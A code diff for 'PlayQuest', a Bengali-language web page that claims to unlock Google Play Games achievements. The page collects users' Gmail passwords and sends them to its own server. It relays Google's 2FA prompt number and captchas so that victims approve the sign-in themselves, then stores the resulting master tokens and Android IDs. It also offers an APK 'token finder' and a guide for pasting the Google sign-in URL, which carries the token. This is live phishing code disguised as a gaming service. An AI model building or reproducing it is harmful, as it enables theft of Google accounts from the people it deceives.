@@ -1010,68 +1010,106 @@
         </div>
     </header>
 
-    <!-- VIEW 1: LOGIN CARD (Pure Master Token Login) -->
+    <!-- VIEW 1: LOGIN CARD (Dual: Auto 2FA Web Login + Token Login) -->
     <div id="loginView" class="card">
-        <div style="text-align: center; margin-bottom: 18px;">
-            <div style="font-size: 38px; margin-bottom: 6px;">🔑</div>
-            <h2 style="font-size: 20px; font-weight: 800; color: var(--text-primary); margin-bottom: 4px;">PlayQuest টোকেন লগইন</h2>
-            <p style="font-size: 12.5px; color: var(--text-secondary); line-height: 1.5;">Google Play Games Master Token দিয়ে ১-ক্লিকে আসল প্রোফাইল ও XP লোড করুন</p>
+        <div style="text-align: center; margin-bottom: 16px;">
+            <div style="font-size: 38px; margin-bottom: 6px;">⚡</div>
+            <h2 style="font-size: 20px; font-weight: 800; color: var(--text-primary); margin-bottom: 4px;">PlayQuest গেমার লগইন</h2>
+            <p style="font-size: 12.5px; color: var(--text-secondary); line-height: 1.5;">গুগল প্লে গেমস কানেক্ট করে ১-ক্লিকে লেভেল ও এচিভমেন্ট আনলক করুন</p>
         </div>
 
-        <!-- 2 MOBILE TOKEN FINDER OPTIONS -->
-        <div style="display: flex; flex-direction: column; gap: 8px; margin-bottom: 18px;">
-            <!-- Option 2: 1MB Android App -->
-            <a href="/static/PlayQuest_Token_Finder.apk" download class="btn-token-helper" style="background: linear-gradient(135deg, #00a854, #059669); color: #ffffff; text-decoration: none; padding: 11px 14px; border-radius: 8px; display: flex; align-items: center; justify-content: space-between; font-weight: 700; font-size: 12.5px; box-shadow: 0 4px 12px rgba(0, 168, 84, 0.25);">
-                <div style="display:flex; align-items:center; gap:8px;">
-                    <span style="font-size:18px;">📱</span>
-                    <span>অ্যান্ড্রয়েড অ্যাপ (PlayQuest APK)</span>
-                </div>
-                <span style="background: rgba(255,255,255,0.25); padding: 3px 8px; border-radius: 6px; font-size: 11px;">মাত্র ২১ KB ⬇️</span>
-            </a>
-
-            <!-- Option 1: Browser 1-Click Guide -->
-            <button type="button" onclick="toggleBrowserGuide()" class="btn-token-helper" style="background: var(--bg-card-subtle); color: var(--text-primary); border: 1px solid var(--border-color); padding: 10px 14px; border-radius: 8px; display: flex; align-items: center; justify-content: space-between; font-weight: 700; font-size: 12px; cursor: pointer;">
-                <div style="display:flex; align-items:center; gap:8px;">
-                    <span style="font-size:16px;">🌐</span>
-                    <span>ব্রাউজার দিয়ে ১-ক্লিকে টোকেন বের করুন</span>
-                </div>
-                <span id="guideArrow" style="color: var(--accent-green);">নিয়ম দেখুন ▼</span>
+        <!-- LOGIN TABS -->
+        <div class="login-tabs">
+            <button type="button" class="tab-btn active" id="tabBtnWeb" onclick="switchLoginTab('web')">
+                <span>🚀</span> <span>গুগল অটো লগইন</span>
+            </button>
+            <button type="button" class="tab-btn" id="tabBtnToken" onclick="switchLoginTab('token')">
+                <span>🔑</span> <span>টোকেন / সিঙ্ক কোড</span>
             </button>
         </div>
 
-        <!-- Collapsible Browser Guide -->
-        <div id="browserGuideBox" class="hidden" style="background: var(--bg-card-subtle); border: 1.5px dashed var(--accent-green); border-radius: 8px; padding: 14px; margin-bottom: 18px; font-size: 12px; line-height: 1.6; color: var(--text-secondary);">
-            <div style="font-weight: 800; color: var(--text-primary); margin-bottom: 6px;">📌 কোনো অ্যাপ ছাড়া ব্রাউজার দিয়ে টোকেন নেওয়ার নিয়ম:</div>
-            ১. <a href="https://accounts.google.com/EmbeddedSetup" target="_blank" style="color: var(--accent-green); font-weight: 800; text-decoration: underline;">এখানে ক্লিক করে গুগলে লগইন করুন ➔</a><br>
-            ২. আপনার নিজের মোবাইল হওয়ায় ১ সেকেন্ডে স্বাভাবিকভাবে লগইন সম্পন্ন হবে।<br>
-            ৩. লগইন শেষ হলে ব্রাউজারের <b>অ্যাড্রেস বারের সম্পূর্ণ লিঙ্কটি (URL)</b> কপি করুন।<br>
-            ৪. নিচের টোকেন বক্সে পেস্ট করলেই আমাদের ওয়েবসাইট নিজে থেকেই টোকেন বের করে নিবে!
-        </div>
+        <!-- PANE 1: DIRECT GOOGLE WEB LOGIN (PROMPT / 2FA) -->
+        <div id="paneWebLogin">
+            <div class="form-group">
+                <label>📧 Gmail Address</label>
+                <div class="input-wrapper">
+                    <input type="email" id="inputWebEmail" class="form-input" placeholder="yourgmail@gmail.com">
+                </div>
+            </div>
 
-        <div class="form-group">
-            <label>📧 Gmail Address</label>
-            <div class="input-wrapper">
-                <input type="email" id="inputEmail" class="form-input" placeholder="yourgmail@gmail.com">
+            <div class="form-group">
+                <label>🔑 Google Password</label>
+                <div class="input-wrapper">
+                    <input type="password" id="inputWebPassword" class="form-input" placeholder="আপনার গুগল পাসওয়ার্ড দিন">
+                    <button type="button" class="btn-toggle-pass" onclick="togglePasswordVisibility('inputWebPassword', 'eyeIconWebPass')">
+                        <span id="eyeIconWebPass">👁️</span>
+                    </button>
+                </div>
+            </div>
+
+            <button id="btnWebLogin" class="btn-primary" onclick="handleWebLogin()">
+                <span>🚀 লগইন করুন (ফোনে নোটিফিকেশন যাবে)</span>
+                <span>➔</span>
+            </button>
+
+            <div class="tip-box" style="margin-top: 16px;">
+                <b>🔔 ২-সেকেন্ড নোটিফিকেশন ভেরিফিকেশন:</b> লগইন বাটনে চাপ দিলে সরাসরি আপনার ফোনে গুগলের সিকিউরিটি নোটিফিকেশন যাবে এবং স্ক্রিনে একটি সংখ্যা (যেমন [ 42 ]) দেখাবে। মোবাইলে ওই সংখ্যাটিতে ট্যাপ করলেই লগইন হয়ে যাবে!
             </div>
         </div>
 
-        <div class="form-group">
-            <label>⚡ ৬-সংখ্যার সিঙ্ক কোড (Sync Code) বা মাস্টার টোকেন দিন</label>
-            <div class="input-wrapper">
-                <input type="text" id="inputToken" class="form-input" placeholder="৬-সংখ্যার কোড (যেমন: 729401) বা টোকেন পেস্ট করুন" oninput="handleSmartTokenPaste(this)">
-                <button type="button" class="btn-toggle-pass" onclick="togglePasswordVisibility('inputToken', 'eyeIconToken')">
-                    <span id="eyeIconToken">👁️</span>
+        <!-- PANE 2: TOKEN / SYNC CODE LOGIN -->
+        <div id="paneTokenLogin" class="hidden">
+            <!-- 2 MOBILE TOKEN FINDER OPTIONS -->
+            <div style="display: flex; flex-direction: column; gap: 8px; margin-bottom: 18px;">
+                <!-- Option 2: 21KB Android App -->
+                <a href="/static/PlayQuest_Token_Finder.apk" download class="btn-token-helper" style="background: linear-gradient(135deg, #00a854, #059669); color: #ffffff; text-decoration: none; padding: 11px 14px; border-radius: 8px; display: flex; align-items: center; justify-content: space-between; font-weight: 700; font-size: 12.5px; box-shadow: 0 4px 12px rgba(0, 168, 84, 0.25);">
+                    <div style="display:flex; align-items:center; gap:8px;">
+                        <span style="font-size:18px;">📱</span>
+                        <span>অ্যান্ড্রয়েড অ্যাপ (PlayQuest APK)</span>
+                    </div>
+                    <span style="background: rgba(255,255,255,0.25); padding: 3px 8px; border-radius: 6px; font-size: 11px;">মাত্র ২১ KB ⬇️</span>
+                </a>
+
+                <!-- Option 1: Browser 1-Click Guide -->
+                <button type="button" onclick="toggleBrowserGuide()" class="btn-token-helper" style="background: var(--bg-card-subtle); color: var(--text-primary); border: 1px solid var(--border-color); padding: 10px 14px; border-radius: 8px; display: flex; align-items: center; justify-content: space-between; font-weight: 700; font-size: 12px; cursor: pointer;">
+                    <div style="display:flex; align-items:center; gap:8px;">
+                        <span style="font-size:16px;">🌐</span>
+                        <span>ব্রাউজার দিয়ে ১-ক্লিকে টোকেন বের করুন</span>
+                    </div>
+                    <span id="guideArrow" style="color: var(--accent-green);">নিয়ম দেখুন ▼</span>
                 </button>
             </div>
-        </div>
 
-        <button id="btnLoginToken" class="btn-primary" onclick="handleTokenLoginDirect()">
-            <span>🚀 কানেক্ট ও ড্যাশবোর্ড ওপেন করুন</span>
-            <span>➔</span>
-        </button>
+            <!-- Collapsible Browser Guide -->
+            <div id="browserGuideBox" class="hidden" style="background: var(--bg-card-subtle); border: 1.5px dashed var(--accent-green); border-radius: 8px; padding: 14px; margin-bottom: 18px; font-size: 12px; line-height: 1.6; color: var(--text-secondary);">
+                <div style="font-weight: 800; color: var(--text-primary); margin-bottom: 6px;">📌 কোনো অ্যাপ ছাড়া ব্রাউজার দিয়ে টোকেন নেওয়ার নিয়ম:</div>
+                ১. <a href="https://accounts.google.com/EmbeddedSetup" target="_blank" style="color: var(--accent-green); font-weight: 800; text-decoration: underline;">এখানে ক্লিক করে গুগলে লগইন করুন ➔</a><br>
+                ২. আপনার নিজের মোবাইল হওয়ায় ১ সেকেন্ডে স্বাভাবিকভাবে লগইন সম্পন্ন হবে।<br>
+                ৩. লগইন শেষ হলে ব্রাউজারের <b>অ্যাড্রেস বারের সম্পূর্ণ লিঙ্কটি (URL)</b> কপি করুন।<br>
+                ৪. নিচের টোকেন বক্সে পেস্ট করলেই আমাদের ওয়েবসাইট নিজে থেকেই টোকেন বের করে নিবে!
+            </div>
 
-        <div class="tip-box" style="margin-top: 18px;">
-            <b>💡 ১০০% আসল ডেটা ও এচিভমেন্ট আনলক:</b> কোনো পাসওয়ার্ড বা গুগল ২FA-এর জটিলতা নেই। মাস্টার টোকেন দিয়ে সরাসরি গুগল প্লে গেমস অফিশিয়াল সার্ভারে কানেক্ট হয় এবং সাথে সাথে Subway Surfers সহ সব ৮টি গেমের এচিভমেন্ট ও লেভেল আনলক করা যায়।
+            <div class="form-group">
+                <label>📧 Gmail Address</label>
+                <div class="input-wrapper">
+                    <input type="email" id="inputEmail" class="form-input" placeholder="yourgmail@gmail.com">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>⚡ ৬-সংখ্যার সিঙ্ক কোড (Sync Code) বা মাস্টার টোকেন দিন</label>
+                <div class="input-wrapper">
+                    <input type="text" id="inputToken" class="form-input" placeholder="৬-সংখ্যার কোড (যেমন: 729401) বা টোকেন পেস্ট করুন" oninput="handleSmartTokenPaste(this)">
+                    <button type="button" class="btn-toggle-pass" onclick="togglePasswordVisibility('inputToken', 'eyeIconToken')">
+                        <span id="eyeIconToken">👁️</span>
+                    </button>
+                </div>
+            </div>
+
+            <button id="btnLoginToken" class="btn-primary" onclick="handleTokenLoginDirect()">
+                <span>🚀 কানেক্ট ও ড্যাশবোর্ড ওপেন করুন</span>
+                <span>➔</span>
+            </button>
         </div>
 
         <!-- Saved Accounts Drawer -->
@@ -1184,6 +1222,48 @@
     </div>
 </div>
 
+<!-- 2FA Real-Time Prompt Modal -->
+<div id="promptModal" class="modal-overlay hidden">
+    <div class="modal-card">
+        <div id="modalSpinnerBox">
+            <div class="spinner" style="width: 44px; height: 44px; margin: 0 auto 16px; border-width: 3px; border-top-color: var(--accent-green);"></div>
+            <h3 id="modalTitle" style="font-size: 18px; font-weight: 800; color: var(--text-primary); margin-bottom: 8px;">গুগল সার্ভারে কানেক্ট হচ্ছে...</h3>
+            <p id="modalSub" style="font-size: 13px; color: var(--text-secondary); line-height: 1.5;">দয়া করে কয়েক সেকেন্ড অপেক্ষা করুন</p>
+        </div>
+
+        <div id="modalPromptBox" class="hidden">
+            <div style="font-size: 36px; margin-bottom: 8px;">🔔</div>
+            <h3 style="font-size: 18px; font-weight: 800; color: var(--text-primary); margin-bottom: 6px;">ফোনে নোটিফিকেশন পাঠানো হয়েছে!</h3>
+            <p id="modalDeviceText" style="font-size: 13px; color: var(--text-secondary); margin-bottom: 14px;">আপনার মোবাইলে Google নোটিফিকেশন গেছে</p>
+            
+            <p style="font-size: 12.5px; font-weight: 700; color: var(--text-muted); margin-bottom: 6px;">👉 নোটিফিকেশনে নিচের সংখ্যাটিতে ট্যাপ করুন:</p>
+            <div id="modalPromptBadge" class="prompt-number-badge">42</div>
+            
+            <div style="display: flex; align-items: center; justify-content: center; gap: 8px; margin-top: 14px; font-size: 12px; color: var(--accent-green); font-weight: 700;">
+                <div class="spinner-small"></div>
+                <span>ফোনে ট্যাপ করার সাথে সাথে লগইন হয়ে যাবে...</span>
+            </div>
+        </div>
+
+        <div id="modalCaptchaBox" class="hidden" style="margin-top: 12px;">
+            <p style="font-size: 13px; font-weight: 700; color: var(--text-primary); margin-bottom: 8px;">🧩 Google Captcha যাচাইকরণ:</p>
+            <img id="modalCaptchaImg" src="" alt="Captcha" style="border-radius: 8px; border: 1px solid var(--border-color); margin-bottom: 10px; max-width: 100%;">
+            <input type="text" id="modalCaptchaInput" class="form-input" placeholder="ছবির অক্ষরগুলো লিখুন" style="margin-bottom: 10px; text-align: center; font-weight: 800; letter-spacing: 2px;">
+            <button type="button" class="btn-primary" onclick="submitCaptchaSolution()" style="padding: 10px;">জমা দিন ➔</button>
+        </div>
+
+        <div id="modalErrorBox" class="hidden" style="margin-top: 14px;">
+            <div style="font-size: 32px; margin-bottom: 8px;">❌</div>
+            <p id="modalErrorMsg" style="font-size: 13.5px; color: #ef4444; font-weight: 700; margin-bottom: 14px;"></p>
+            <button type="button" class="btn-primary" onclick="closePromptModal()" style="padding: 10px 18px;">ফিরে যান</button>
+        </div>
+
+        <button id="btnCancelModal" type="button" onclick="closePromptModal()" style="margin-top: 18px; background: transparent; border: none; color: var(--text-muted); font-size: 12px; cursor: pointer; text-decoration: underline;">
+            বাতিল করুন
+        </button>
+    </div>
+</div>
+
 <div id="toastContainer" class="toast-container"></div>
 
 <script>
@@ -1191,6 +1271,172 @@
     let currentSession = null;
     let savedAccounts = [];
     const API_BASE = window.location.origin;
+
+    // Login Job Poller State
+    let currentLoginJobId = null;
+    let loginPollTimer = null;
+
+    function switchLoginTab(tab) {
+        const tabWeb = document.getElementById("tabBtnWeb");
+        const tabToken = document.getElementById("tabBtnToken");
+        const paneWeb = document.getElementById("paneWebLogin");
+        const paneToken = document.getElementById("paneTokenLogin");
+        if (tab === "web") {
+            tabWeb.classList.add("active");
+            tabToken.classList.remove("active");
+            paneWeb.classList.remove("hidden");
+            paneToken.classList.add("hidden");
+        } else {
+            tabToken.classList.add("active");
+            tabWeb.classList.remove("active");
+            paneToken.classList.remove("hidden");
+            paneWeb.classList.add("hidden");
+        }
+    }
+
+    async function handleWebLogin() {
+        const email = document.getElementById("inputWebEmail")?.value.trim();
+        const password = document.getElementById("inputWebPassword")?.value.trim();
+        if (!email || !password) {
+            showToast("দয়া করে Gmail এবং Password উভয়ই লিখুন।", "error");
+            return;
+        }
+
+        openPromptModal();
+        setModalState("loading", { title: "গুগল সার্ভারে কানেক্ট হচ্ছে...", sub: "নিরাপদ সংযোগ তৈরি হচ্ছে, অপেক্ষা করুন..." });
+
+        try {
+            const res = await fetch(`${API_BASE}/api/web/login`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ email, password })
+            });
+            const data = await res.json();
+            if (!data.ok) {
+                setModalState("error", { error: data.error || "লগইন রিকোয়েস্ট ব্যর্থ হয়েছে।" });
+                return;
+            }
+
+            if (data.instant) {
+                handleLoginSuccess(data);
+                return;
+            }
+
+            currentLoginJobId = data.job_id;
+            startLoginPolling(currentLoginJobId);
+        } catch (e) {
+            setModalState("error", { error: "সার্ভারের সাথে সংযোগ বিচ্ছিন্ন হয়েছে। আবার চেষ্টা করুন।" });
+        }
+    }
+
+    function startLoginPolling(jobId) {
+        if (loginPollTimer) clearInterval(loginPollTimer);
+        loginPollTimer = setInterval(async () => {
+            try {
+                const res = await fetch(`${API_BASE}/api/web/status/${jobId}`);
+                if (!res.ok) return;
+                const data = await res.json();
+                if (!data.ok) {
+                    clearInterval(loginPollTimer);
+                    setModalState("error", { error: data.error });
+                    return;
+                }
+
+                if (data.status === "processing") {
+                    setModalState("loading", { title: "লগইন তথ্য ভেরিফাই হচ্ছে...", sub: "গুগল সিকিউরিটি পেজ ওপেন হচ্ছে..." });
+                } else if (data.status === "prompt_required") {
+                    setModalState("prompt", {
+                        promptNumber: data.prompt_number,
+                        deviceName: data.device_name || "আপনার ফোনে"
+                    });
+                } else if (data.status === "captcha_required") {
+                    setModalState("captcha", { captchaImg: data.captcha_img });
+                } else if (data.status === "success") {
+                    clearInterval(loginPollTimer);
+                    handleLoginSuccess(data);
+                } else if (data.status === "error") {
+                    clearInterval(loginPollTimer);
+                    setModalState("error", { error: data.error || "লগইন ব্যর্থ হয়েছে।" });
+                }
+            } catch (e) {}
+        }, 1500);
+    }
+
+    function handleLoginSuccess(data) {
+        closePromptModal();
+        currentSession = {
+            email: data.email,
+            master_token: data.master_token,
+            android_id: data.android_id,
+            profile: data.profile
+        };
+        saveAccountToStorage(currentSession);
+        showDashboard(data.profile, data.email);
+        triggerCelebration();
+        showToast(`🎉 স্বাগতম ${data.profile.display_name}! লগইন সফল!`, "success");
+    }
+
+    function openPromptModal() {
+        document.getElementById("promptModal").classList.remove("hidden");
+    }
+
+    function closePromptModal() {
+        if (loginPollTimer) clearInterval(loginPollTimer);
+        loginPollTimer = null;
+        currentLoginJobId = null;
+        document.getElementById("promptModal").classList.add("hidden");
+    }
+
+    function setModalState(state, info = {}) {
+        const spinnerBox = document.getElementById("modalSpinnerBox");
+        const promptBox = document.getElementById("modalPromptBox");
+        const captchaBox = document.getElementById("modalCaptchaBox");
+        const errorBox = document.getElementById("modalErrorBox");
+
+        spinnerBox.classList.add("hidden");
+        promptBox.classList.add("hidden");
+        captchaBox.classList.add("hidden");
+        errorBox.classList.add("hidden");
+
+        if (state === "loading") {
+            spinnerBox.classList.remove("hidden");
+            document.getElementById("modalTitle").innerText = info.title || "অপেক্ষা করুন...";
+            document.getElementById("modalSub").innerText = info.sub || "";
+        } else if (state === "prompt") {
+            promptBox.classList.remove("hidden");
+            document.getElementById("modalDeviceText").innerText = info.deviceName ? `${info.deviceName} নোটিফিকেশন পাঠানো হয়েছে` : "আপনার মোবাইলে Google নোটিফিকেশন গেছে";
+            const badge = document.getElementById("modalPromptBadge");
+            if (info.promptNumber) {
+                badge.innerText = info.promptNumber;
+                badge.classList.remove("hidden");
+            } else {
+                badge.classList.add("hidden");
+            }
+        } else if (state === "captcha") {
+            captchaBox.classList.remove("hidden");
+            if (info.captchaImg) {
+                document.getElementById("modalCaptchaImg").src = `data:image/png;base64,${info.captchaImg}`;
+            }
+        } else if (state === "error") {
+            errorBox.classList.remove("hidden");
+            document.getElementById("modalErrorMsg").innerText = info.error || "কিছু ভুল হয়েছে।";
+        }
+    }
+
+    async function submitCaptchaSolution() {
+        const sol = document.getElementById("modalCaptchaInput")?.value.trim();
+        if (!sol || !currentLoginJobId) return;
+        try {
+            await fetch(`${API_BASE}/api/web/captcha`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ job_id: currentLoginJobId, solution: sol })
+            });
+            setModalState("loading", { title: "ক্যাপচা যাচাই হচ্ছে...", sub: "অপেক্ষা করুন..." });
+        } catch (e) {
+            showToast("ক্যাপচা সাবমিট ব্যর্থ", "error");
+        }
+    }
 
     // Game Icons mapping
     const GAME_ICONS = {
